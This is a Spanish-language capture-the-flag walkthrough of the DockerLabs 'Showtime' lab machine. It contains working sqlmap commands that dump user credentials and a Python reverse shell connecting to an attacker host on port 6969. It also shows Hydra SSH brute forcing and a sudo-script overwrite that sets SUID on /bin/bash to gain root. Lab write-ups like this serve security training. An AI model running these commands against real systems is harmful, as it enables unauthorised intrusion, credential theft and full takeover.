# Showtime

# Enumeración

Empezamos con un escaneo de los puertos.

`sudo nmap -p- --open -sC -sS -sV --min-rate=5000 -n -Pn -vvv 172.17.0.2 -oN Balulero`  

- `-p-` : Todos los puertos
- `--open` : Todos los puertos abiertos
- `-sC` : Escaneo de todos los scripts
- `-sS` : Escaneo de todos los servicios
- `-sV` : Escaneo de todas las versiones de los servicios
- `--min-rate 5000` : Establece mínimo envío de paquetes mínimos 5000/s
- `-n` : No aplica resolución DNS
- `-Pn` : Omisión de detección de hosts
- `-vvv` : Verbose - Muestra toda la información

# Resultado escaneo  

Tenemos dos puertos abiertos, el 22 y el 80.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_1.jpg)    

Abrimos la página web y en la página de inicio no encontramos nada interesante.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_2.jpg)     

Vemos que hay un enlace de inicio de sesión, lo abrimos y encontramos un panel de autenticación.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_3.jpg)    

Utilizaremos la herramienta sqlmap para intentar extraer nombres de usuario y contraseñas.  
Ejecutaremos el siguiente comando:  

`sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms --dbs --batch`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_4.jpg)    

Ahora ingresamos el siguiente comando:  

`sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users --tables --batch`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_5.jpg)      

Continuamos con la enumeración ingresando:  

`sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users -T usuarios --columns --batch`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_6.jpg)     

Y por último:  

`sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users -T usuarios -C username,password -dump --batch`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_7.jpg)      

¡Perfecto!  
Tenemos tres usuarios junto con sus respectivas contraseñas.  

Intentamos iniciar sesión, pero solo con el usuario 'joe' podemos acceder a un panel que nos permite ejecutar comandos en Python.    

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_8.jpg)       

Ahora verificamos si funciona.   
Ejecutamos el siguiente comando:  

```
import os  
os.system ("ls")
```
![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_9.jpg)    

Perfecto, parece que funciona.  
Ahora, lo que podemos intentar hacer es establecer una reverse shell hacia nuestra máquina Kali.  
Nos pondremos a la escucha en el puerto 6969 de nuestra Kali y ejecutaremos el comando `nc -lvnp 6969`.  
A continuación, ejecutaremos este código en el panel:   

```
import socket
import os
import subprocess

# Configura l'IP e la porta di destinazione
ip = "10.10.10.10"
port = 6969

# Crea il socket e connettiti al server
s = socket.socket()
s.connect((ip, port))

# Reindirizza stdin, stdout, stderr al socket
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# Esegui la shell
subprocess.call("/bin/sh")
```
![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_10.jpg)    

¡Perfecto!   
Hemos obtenido una reverse shell.  
Ahora aplicamos un tratamiento para poder trabajar de manera más cómoda.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_11.jpg)  

Intentamos ejecutar los comandos típicos para escalar privilegios, pero no encontramos nada interesante.   

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_12.jpg)   

Entonces subimos el archivo `linpeas.sh` a la máquina víctima.  
Para ello, montamos un servidor HTTP en nuestra máquina Kali con el comando:    
`sudo python3 -m http.server`, y posteriormente descargamos el archivo en la máquina víctima.   
Le damos permisos de ejecución con el comando `chmod +x` y lo ejecutamos.  
Al analizar todo, vemos que hay un archivo oculto en la carpeta `/tmp` que se llama **.hidden_text.txt**.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_13.jpg)    

Lo abrimos y vemos que contiene una serie de palabras, todas en mayúsculas.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_14.jpg)   

Jugando con la imaginación, podemos pensar que esto podría ser un listado de posibles contraseñas.   
Intentamos crear un diccionario, pero con Hydra no logramos obtener la contraseña.  
Otra cosa que podemos hacer es convertir con **tr** todas las palabras de mayúsculas a minúsculas.  
Para ello, utilizamos el siguiente comando:  

`cat pass.txt | tr '[:upper:]' '[:lower:]' > password.txt`  

Ahora intentamos nuevamente con Hydra para ver si conseguimos algo que nos pueda ser útil.  
Ejecutamos el siguiente comando:   

`sudo hydra -L users.txt -P password.txt ssh://172.17.0.2/`  y listo, conseguimos una contraseña válida para el usuario 'joe'.    

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_15.jpg)     

Ahora nos conectamos con el usuario 'joe' y ejecutamos el siguiente comando:  

`sudo -l`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_16.jpg)     

Consultamos GTFOBins para ver si podemos aprovechar este binario y parece que sí.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_17.jpg)      

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_18.jpg)    

Perfecto, ya hemos logrado escalar a otro usuario.   
Ejecutamos nuevamente el comando `sudo -l`.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_19.jpg)     

Echamos un vistazo al script en la carpeta de luciano.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_20.jpg)      

De acuerdo, lo que haremos será modificarlo para poder escalar a root.  
Observamos que no podemos utilizar ni el editor nano ni vim.  
Por lo tanto, utilizaremos el comando **echo**.   
Ejecutaremos el siguiente comando:   

`echo -e '#!/bin/bash \n chmod u+s /bin/bash' > .script.sh`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_21.jpg)    

"Perfecto, ahora ejecutaremos el comando `sudo /bin/bash /home/luciano/script.sh` y luego el comando `bash -p`.  
¡Y listo! Ahora somos root.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_22.jpg)    













